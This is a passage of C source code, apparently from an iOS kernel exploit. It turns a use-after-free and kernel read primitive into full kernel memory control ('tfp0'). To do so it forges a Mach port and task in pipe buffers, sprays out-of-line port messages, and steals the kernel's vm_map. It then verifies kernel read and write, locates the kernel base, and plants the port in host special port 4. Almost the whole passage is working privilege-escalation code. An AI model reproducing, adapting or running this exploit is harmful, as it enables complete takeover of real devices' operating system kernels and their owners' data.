        PWN_LOG("[-] kernel read primitive failed!\n");
        goto err;
    }
    PWN_LOG_KPTR("[i] ipc_space_kernel:", ipc_space_kernel);

    updateStage(2);

    // here we'll create a pair of pipes (4 file descriptors in total)
    // first pipe, used to overwrite a port pointer in a mach message
    int fds[2];
    ret = pipe(fds);
    if (ret) {
        PWN_LOG("[-] failed to create pipe\n");
        goto err;
    }

    // make the buffer of the first pipe 0x10000 bytes (this could be other sizes, but know that kernel does some calculations on how big this gets, i.e. when I made the buffer 20 bytes, it'd still go to _kalloc.512
#ifdef __LP64__
    static const size_t pipebuf_size = 0x10000;
#else
    static const size_t pipebuf_size = 0x8000;
#endif
    uint8_t pipebuf[pipebuf_size];
    memset(pipebuf, 0, pipebuf_size);

    write(fds[1], pipebuf, pipebuf_size); // do write() to allocate the buffer on the kernel
    read(fds[0], pipebuf, pipebuf_size); // do read() to reset buffer position
    write(fds[1], pipebuf, sizeof(kptr_t)); // write 8 bytes so later we can read the first 8 bytes (used to verify if spraying worked)

    // second pipe, used for our fake port
    int port_fds[2] = { -1, -1 };
    if (SMAP) {
        ret = pipe(port_fds);
        if (ret) {
            PWN_LOG("[-] failed to create pipe\n");
            goto err;
        }
    }

    // create fake port and fake task, put fake_task right after fakeport
#ifdef __LP64__
    size_t fake_task_size = 0x600;
#else
    size_t fake_task_size = round_page_kernel(0x3b0);
#endif
    kport_t* fakeport = malloc(sizeof(kport_t) + fake_task_size);
    ktask_t* fake_task = (ktask_t*)((kptr_t)fakeport + sizeof(kport_t));
    bzero((void*)fakeport, sizeof(kport_t) + fake_task_size);

    fake_task->ref_count = 0xff;

    fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakeport->ip_references = 0xd00d;
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = 0;
    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fakeport->ip_srights = 99;
    fakeport->ip_kobject = 0;
    fakeport->ip_receiver = ipc_space_kernel;

    if (SMAP) {
        write(port_fds[1], (void*)fakeport, sizeof(kport_t) + fake_task_size);
        read(port_fds[0], (void*)fakeport, sizeof(kport_t) + fake_task_size);
    }

    updateStage(3);
    // find the pipe buffers for both pipes

    kptr_t task = kernel_read_kptr_check(self_port_addr + koffset(socket.ipc_port_ip_kobject));
    kptr_t proc = kernel_read_kptr_check(task + koffset(socket.task_bsd_info));
    kptr_t p_fd = kernel_read_kptr_check(proc + koffset(socket.proc_p_fd));
    kptr_t fd_ofiles = kernel_read_kptr_check(p_fd + koffset(socket.filedesc_fd_ofiles));

    kptr_t fproc = kernel_read_kptr_check(fd_ofiles + fds[0] * sizeof(kptr_t));
    kptr_t f_fglob = kernel_read_kptr_check(fproc + koffset(socket.fileproc_f_fglob));
    kptr_t fg_data = kernel_read_kptr_check(f_fglob + koffset(socket.fileglob_fg_data));
    kptr_t pipe_buffer = kernel_read_kptr_check(fg_data + koffset(socket.pipe_buffer));
    PWN_LOG_KPTR("[*] pipe buffer:", pipe_buffer);

    kptr_t port_fg_data = 0;
    kptr_t port_pipe_buffer = 0;

    if (SMAP) {
        fproc = kernel_read_kptr_check(fd_ofiles + port_fds[0] * sizeof(kptr_t));
        f_fglob = kernel_read_kptr_check(fproc + koffset(socket.fileproc_f_fglob));
        port_fg_data = kernel_read_kptr_check(f_fglob + koffset(socket.fileglob_fg_data));
        port_pipe_buffer = kernel_read_kptr_check(port_fg_data + koffset(socket.pipe_buffer));
        PWN_LOG_KPTR("[*] second pipe buffer:", port_pipe_buffer);
    }

    if (SMAP) {
        // align ip_kobject at our fake task, so the address of fake port + sizeof(kport_t)
        fakeport->ip_kobject = port_pipe_buffer + sizeof(kport_t);
    } else {
        fakeport->ip_kobject = (kptr_t)fake_task;
    }

    if (SMAP) {
        // update our pipe buffer
        write(port_fds[1], (void*)fakeport, sizeof(kport_t) + fake_task_size);
    }

    updateStage(4);

    // create a new port, this one we'll use for tfp0
    mach_port_t target = new_port();
    if (!target) {
        PWN_LOG("[-] failed to allocate port\n");
        goto err;
    }

    // get its kernel address
    kptr_t target_addr = find_port_via_uaf(target, MACH_MSG_TYPE_COPY_SEND);
    if (!target_addr) {
        PWN_LOG("[-] failed to leak target port address\n");
        goto err;
    }

    // free the first pipe buffer
    ret = (int)(kptr_t)primitive(pipe_buffer, false, offsets);
    if (ret) {
        PWN_LOG("[-] failed to free pipe buffer\n");
        goto err;
    }

    updateStage(5);

    // reallocate it while filling it with a mach message containing send rights to our target port
    mach_port_t p = MACH_PORT_NULL;
    for (int i = 0; i < 10000; i++) {

        // pipe is 0x10000 bytes so make 0x10000/8 pointers and save result as we'll use later
        p = fill_kalloc_with_port_pointer(target, pipebuf_size / sizeof(kptr_t), MACH_MSG_TYPE_COPY_SEND);

        // check if spraying worked by reading first 8 bytes
        kptr_t addr;
        read(fds[0], &addr, sizeof(kptr_t));
        if (addr == target_addr) { // if we see the address of our port, it worked
            break;
        }
        write(fds[1], &addr, sizeof(kptr_t)); // reset buffer position

        mach_port_destroy(mach_task_self(), p); // spraying didn't work, so free port
        p = MACH_PORT_NULL;
    }

    if (!p) {
        PWN_LOG("[-] spraying failed!");
        goto err;
    }

    if (SMAP) {
        // spraying worked, now the pipe buffer is filled with pointers to our target port
        // overwrite the first pointer with our second pipe buffer, which contains the fake port
        write(fds[1], &port_pipe_buffer, sizeof(kptr_t));
    } else {
        write(fds[1], &fakeport, sizeof(kptr_t));
    }

    updateStage(6);

    // receive the message from fill_kalloc_with_port_pointers back, since that message contains a send right and we overwrote the pointer of the first port, we now get a send right to the fake port!
    struct ool_msg* msg = malloc(0x1000);
    ret = mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, p, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret) {
        free(msg);
        PWN_LOG("[-] mach_msg() failed: %d (%s)\n", ret, mach_error_string(ret));
        goto err;
    }

    mach_port_t* received_ports = msg->ool_ports.address;
    mach_port_t our_port = received_ports[0]; // fake port!
    free(msg);

    kptr_t* read_addr_ptr = (kptr_t*)((kptr_t)fake_task + koffset(socket.task_bsd_info));

    kptr_t struct_task;
    kr_kptr(self_port_addr + koffset(socket.ipc_port_ip_kobject), struct_task);
    if (!struct_task) {
        PWN_LOG("[-] kernel read failed!\n");
        goto err;
    }

    PWN_LOG_KPTR("[!] READING VIA FAKE PORT WORKED?", struct_task);
    PWN_LOG("[+] Let's steal that kernel task port!\n");

    updateStage(7);

    // tfp0!

    kptr_t kernel_vm_map = 0;

    while (struct_task != 0) {
        kptr_t bsd_info;
        kr_kptr(struct_task + koffset(socket.task_bsd_info), bsd_info);
        if (!bsd_info) {
            PWN_LOG("[-] kernel read failed!\n");
            goto err;
        }

        uint32_t pid;
        kr32(bsd_info + koffset(socket.proc_pid), pid);

        if (pid == 0) {
            kptr_t vm_map;
            kr_kptr(struct_task + koffset(socket.task_vm_map), vm_map);
            if (!vm_map) {
                PWN_LOG("[-] kernel read failed!\n");
                goto err;
            }

            kernel_vm_map = vm_map;
            break;
        }

        kr_kptr(struct_task + koffset(socket.task_prev), struct_task);
    }

    if (!kernel_vm_map) {
        PWN_LOG("[-] failed to find kernel's vm_map\n");
        goto err;
    }

    PWN_LOG_KPTR("[i] kernel_vm_map:", kernel_vm_map);

    updateStage(8);

    read(port_fds[0], (void*)fakeport, sizeof(kport_t) + fake_task_size);

    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;
    fake_task->map = kernel_vm_map;
    *(uint32_t*)((kptr_t)fake_task + koffset(struct_offsets.task_itk_self)) = 1;

    if (SMAP) {
        write(port_fds[1], (void*)fakeport, sizeof(kport_t) + fake_task_size);
    }

    init_kernel_memory(our_port);

    kptr_t addr = _kalloc(8);
    if (!addr) {
        PWN_LOG("[-] seems like tfp0 port didn't work?\n");
        goto err;
    }

#ifdef __LP64__
#define WRITE_VALUE 0x4141414141414141
#else
#define WRITE_VALUE 0xdeadbeef
#endif

    PWN_LOG_KPTR("[*] allocated:", addr);
    kernel_write_kptr(addr, WRITE_VALUE);
    kptr_t readb = kernel_read_kptr(addr);
    _kfree(addr, sizeof(kptr_t));
    PWN_LOG_KPTR("[*] read back:", readb);

    if (readb != WRITE_VALUE) {
        PWN_LOG("[-] read back value didn't match\n");
        goto err;
    }

    updateStage(9);

    PWN_LOG("[*] creating safer port\n");

    mach_port_t new_tfp0 = new_port();
    if (!new_tfp0) {
        PWN_LOG("[-] failed to allocate new tfp0 port\n");
        goto err;
    }

    kptr_t new_addr = find_port(new_tfp0, self_port_addr, offsets);
    if (!new_addr) {
        PWN_LOG("[-] failed to find new tfp0 port address\n");
        goto err;
    }

    kptr_t faketask = _kalloc(fake_task_size);
    if (!faketask) {
        PWN_LOG("[-] failed to kalloc faketask\n");
        goto err;
    }

    kernel_write(faketask, fake_task, fake_task_size);
    fakeport->ip_kobject = faketask;

    kernel_write(new_addr, (const void*)fakeport, sizeof(kport_t));

    updateStage(10);

    PWN_LOG("[*] testing new tfp0 port\n");

    init_kernel_memory(new_tfp0);

    addr = _kalloc(8);
    if (!addr) {
        PWN_LOG("[-] seems like the new tfp0 port didn't work?\n");
        goto err;
    }

    PWN_LOG_KPTR("[+] tfp0:", new_tfp0);
    PWN_LOG_KPTR("[*] allocated:", addr);
    kernel_write_kptr(addr, WRITE_VALUE);
    readb = kernel_read_kptr(addr);
    _kfree(addr, sizeof(kptr_t));
    PWN_LOG_KPTR("[*] read back:", readb);

    if (readb != WRITE_VALUE) {
        PWN_LOG("[-] read back value didn't match\n");
        goto err;
    }

    updateStage(11);

    // clean up port
    kptr_t task_addr = kernel_read_kptr(self_port_addr + koffset(socket.ipc_port_ip_kobject));
    kptr_t itk_space = kernel_read_kptr(task_addr + koffset(socket.task_itk_space));
    kptr_t is_table = kernel_read_kptr(itk_space + koffset(socket.ipc_space_is_table));

    uint32_t port_index = our_port >> 8;
    const int sizeof_ipc_entry_t = koffset(socket.size_ipc_entry);

    kernel_write_32(is_table + (port_index * sizeof_ipc_entry_t) + sizeof(kptr_t), 0);
    kernel_write_kptr(is_table + (port_index * sizeof_ipc_entry_t), 0);
    kernel_write_kptr(fg_data + koffset(socket.pipe_buffer), 0); // freed already via mach_msg()

    if (fds[0] > 0)
        close(fds[0]);
    if (fds[1] > 0)
        close(fds[1]);
    if (port_fds[0] > 0)
        close(port_fds[0]);
    if (port_fds[1] > 0)
        close(port_fds[1]);

    updateStage(12);

#ifdef __LP64__
    // From https://github.com/akusio/KernBypass-Public/blob/ab9183bc98e9b327de9cb142bdc7c287d877b63b/main.m#L177
    mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
    vm_region_extended_info_data_t extended_info;
    task_dyld_info_data_t dyld_info;
    kptr_t rtclock_datap;
    struct mach_header_64 mh64;
    mach_port_t obj_nm;
    mach_vm_size_t sz;

    const kptr_t VM_KERNEL_LINK_ADDRESS = offsets->constant.kernel_image_base;

    if (task_info(new_tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &cnt) == KERN_SUCCESS && dyld_info.all_image_info_size != 0) {
        *kbase = dyld_info.all_image_info_size + VM_KERNEL_LINK_ADDRESS;
        goto cleanup;
    }
    cnt = VM_REGION_EXTENDED_INFO_COUNT;
    for (addr = 0; mach_vm_region(new_tfp0, &addr, &sz, VM_REGION_EXTENDED_INFO, (vm_region_info_t)&extended_info, &cnt, &obj_nm) == KERN_SUCCESS; addr += sz) {
        mach_port_deallocate(mach_task_self(), obj_nm);
        if (extended_info.user_tag == VM_KERN_MEMORY_CPU && extended_info.protection == VM_PROT_DEFAULT) {
            if (kread_addr(addr + CPU_DATA_RTCLOCK_DATAP_OFF, &rtclock_datap, new_tfp0) != KERN_SUCCESS) {
                break;
            }
            PWN_LOG_KPTR("rtclock_datap:", rtclock_datap);
            rtclock_datap = trunc_page_kernel(rtclock_datap);
            do {
                if (rtclock_datap <= VM_KERNEL_LINK_ADDRESS) {
                    goto kernel_base_err;
                }
                rtclock_datap -= vm_kernel_page_size;
                if (kread_buf(rtclock_datap, &mh64, sizeof(mh64), new_tfp0) != KERN_SUCCESS) {
                    goto kernel_base_err;
                }
            } while (mh64.magic != MACHO_HEADER_MAGIC || mh64.cputype != CPU_TYPE_ARM64 || mh64.filetype != MH_EXECUTE);
            *kbase = rtclock_datap;
            goto cleanup;
        }
    }
    goto err;
#else
    vm_region_submap_info_data_64_t info;
    vm_size_t size;
    mach_msg_type_number_t cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
    unsigned int depth = 0;
    vm_address_t kernel_search_addr = KERNEL_SEARCH_ADDRESS;

    while (1) {
        if (KERN_SUCCESS != vm_region_recurse_64(new_tfp0, &kernel_search_addr, &size, &depth, (vm_region_info_t)&info, &cnt))
            break;
        if (size > 0x40000000) {
            pointer_t buf;
            mach_msg_type_number_t sz = 0;
            kernel_search_addr += 0x200000;
            vm_read(new_tfp0, kernel_search_addr + pagesize, 512, &buf, &sz);
            if (*((kptr_t*)buf) != MACHO_HEADER_MAGIC) {
                kernel_search_addr -= 0x200000;
                vm_read(new_tfp0, kernel_search_addr + pagesize, 512, &buf, &sz);
                if (*((kptr_t*)buf) != MACHO_HEADER_MAGIC)
                    break;
            }
            kernel_search_addr += pagesize;
            *kbase = kernel_search_addr;
            goto cleanup;
        }
        kernel_search_addr += size;
    }
#endif

kernel_base_err:
    PWN_LOG("Failed to retrieve kernel base");
err:
    if (port_fds[0] > 0)
        close(port_fds[0]);
    if (port_fds[1] > 0)
        close(port_fds[1]);

    IOSurface_deinit();
    *tfp0 = MACH_PORT_NULL;
    return KERN_FAILURE;

cleanup:
    updateStage(13);

    free((void*)fakeport);
    IOSurface_deinit();
    t = clock() - t;
    double runtime = ((double)t) / CLOCKS_PER_SEC;
    PWN_LOG("[*] tfp0 in %f sec\n", runtime);
    *tfp0 = new_tfp0;

    updateStage(14);

    // Register hsp4 for good measure
    kptr_t realhost = offsets->data.realhost + (*kbase) - offsets->constant.kernel_image_base;
    PWN_LOG_KPTR("[!] realhost:", realhost);
    kernel_write_kptr(realhost + offsets->vortex.realhost_special + (sizeof(kptr_t) * 4), *tfp0);
    PWN_LOG("registered realhost->special[4]");

    return KERN_SUCCESS;
}
